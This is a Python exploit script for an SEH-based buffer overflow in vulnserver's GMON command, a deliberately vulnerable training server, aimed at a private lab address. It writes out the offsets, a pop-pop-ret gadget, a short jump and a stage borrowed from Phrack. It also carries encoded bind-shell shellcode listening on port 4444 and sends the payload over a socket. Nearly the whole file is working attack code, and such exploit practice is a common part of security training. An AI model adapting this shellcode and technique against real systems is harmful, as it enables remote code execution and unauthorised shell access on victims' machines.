#!/usr/bin/python -w
##################################################################################################################
# Author: Tiago Carvalho 
# vulnserver GMON SEH Overflow
# buffer size 5000
# nseh offset 3495
# seh offset 3499
##################################################################################################################

from struct import pack
import socket
import sys

IP="172.16.206.132"

##########################################################################################################################
# Address=0BADF00D Message=EIP contains normal pattern : 0x6d45366d (offset 3499)
# Address=0BADF00D Message=SEH record (nseh field)
# at 0x00b7ffdc overwritten with normal pattern : 0x45356d45 (offset 3495)
# Message=  0x6250172b : pop edi # pop ebp # ret  | asciiprint,ascii {PAGE_EXECUTE_READ} [essfunc.dll] 
# ASLR: False, Rebase: False, SafeSEH: #False, OS: False, v-1.0- (C:\sully\sulley\essfunc.dll)
##########################################################################################################################

seh = pack('<L',0x6250172b)

##########################################################################################################################
# target landing 00B7FFE7 44 INC ESP
##########################################################################################################################
nseh = "\xEB\x09\x90\x90"

##########################################################################################################################
# Taken from phrack #62 Article 7 Originally written by Aaron Adams
# current location - 512
##########################################################################################################################
stage = "\x90"*10+"\xD9\xEE\xD9\x74\x24\xF4\x59\x80\xC1\x0A\x90\xFE\xCD\xFE\xCD\xFF\xE1"

##########################################################################################################################
# Bind shell port 4444 
# x86/shikata_ga_nai succeeded with size 355 (iteration=0)
##########################################################################################################################

shellcode = (
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\xbd\x79\x14\xcd\xe0\xda\xdf\xd9\x74\x24\xf4\x5b\x29\xc9\xb1"
"\x53\x83\xc3\x04\x31\x6b\x0e\x03\x12\x1a\x2f\x15\x18\xca\x2d"
"\xd6\xe0\x0b\x52\x5e\x05\x3a\x52\x04\x4e\x6d\x62\x4e\x02\x82"
"\x09\x02\xb6\x11\x7f\x8b\xb9\x92\xca\xed\xf4\x23\x66\xcd\x97"
"\xa7\x75\x02\x77\x99\xb5\x57\x76\xde\xa8\x9a\x2a\xb7\xa7\x09"
"\xda\xbc\xf2\x91\x51\x8e\x13\x92\x86\x47\x15\xb3\x19\xd3\x4c"
"\x13\x98\x30\xe5\x1a\x82\x55\xc0\xd5\x39\xad\xbe\xe7\xeb\xff"
"\x3f\x4b\xd2\xcf\xcd\x95\x13\xf7\x2d\xe0\x6d\x0b\xd3\xf3\xaa"
"\x71\x0f\x71\x28\xd1\xc4\x21\x94\xe3\x09\xb7\x5f\xef\xe6\xb3"
"\x07\xec\xf9\x10\x3c\x08\x71\x97\x92\x98\xc1\xbc\x36\xc0\x92"
"\xdd\x6f\xac\x75\xe1\x6f\x0f\x29\x47\xe4\xa2\x3e\xfa\xa7\xaa"
"\xf3\x37\x57\x2b\x9c\x40\x24\x19\x03\xfb\xa2\x11\xcc\x25\x35"
"\x55\xe7\x92\xa9\xa8\x08\xe3\xe0\x6e\x5c\xb3\x9a\x47\xdd\x58"
"\x5a\x67\x08\xf4\x52\xce\xe3\xeb\x9f\xb0\x53\xac\x0f\x59\xbe"
"\x23\x70\x79\xc1\xe9\x19\x12\x3c\x12\x34\xbf\xc9\xf4\x5c\x2f"
"\x9c\xaf\xc8\x8d\xfb\x67\x6f\xed\x29\xd0\x07\xa6\x3b\xe7\x28"
"\x37\x6e\x4f\xbe\xbc\x7d\x4b\xdf\xc2\xab\xfb\x88\x55\x21\x6a"
"\xfb\xc4\x36\xa7\x6b\x64\xa4\x2c\x6b\xe3\xd5\xfa\x3c\xa4\x28"
"\xf3\xa8\x58\x12\xad\xce\xa0\xc2\x96\x4a\x7f\x37\x18\x53\xf2"
"\x03\x3e\x43\xca\x8c\x7a\x37\x82\xda\xd4\xe1\x64\xb5\x96\x5b"
"\x3f\x6a\x71\x0b\xc6\x40\x42\x4d\xc7\x8c\x34\xb1\x76\x79\x01"
"\xce\xb7\xed\x85\xb7\xa5\x8d\x6a\x62\x6e\xbd\x20\x2e\xc7\x56"
"\xed\xbb\x55\x3b\x0e\x16\x99\x42\x8d\x92\x62\xb1\x8d\xd7\x67"
"\xfd\x09\x04\x1a\x6e\xfc\x2a\x89\x8f\xd5")

##########################################################################################################################
# landing after nseh short jump 00B7FFE7   44  INC ESP
# buffer size 5000
# nseh offset 3495
# seh offset 3499
# Badchars x00 x0a 0xd
# payload format [[crash 3010][nops 10][shellcode][padding] 3495][nseh][seh][stage][junk (5000 - (3495+8+len(stage)))]
##########################################################################################################################
payload = "A" * 3011 + shellcode + "\x90" * (3495 - (3011 + len(shellcode))) + nseh + seh + stage + "D" * (5000 - (3495+8+len(stage)))

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect((IP, 8888))

s.send("GMON /.:/"+ payload + "\r\n")
s.close